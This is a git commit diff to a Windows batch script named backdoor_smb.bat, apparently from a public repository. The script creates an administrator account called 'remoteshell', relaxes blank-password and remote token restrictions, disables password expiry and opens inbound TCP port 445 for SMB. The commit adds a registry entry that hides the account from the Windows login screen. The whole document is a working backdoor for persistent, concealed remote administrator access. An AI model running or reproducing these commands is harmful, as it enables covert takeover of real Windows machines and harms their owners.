a0a1821ce7d7e66490c83dd5362a5e7330f34656
DevilBot000 <57672874+DevilBot000@users.noreply.github.com>
2022-09-08 11:29:42 +0530

    Update backdoor_smb.bat

--- backdoor_smb.bat
+++ backdoor_smb.bat
@@ -4,5 +4,6 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankp
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 net users remoteshell /add
 net localgroup Administrators /add remoteshell
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v remoteshell
 WMIC USERACCOUNT WHERE Name='remoteshell' SET PasswordExpires=FALSE
 netsh advfirewall firewall add rule name="TCP Port 445" dir=in action=allow protocol=TCP localport=445
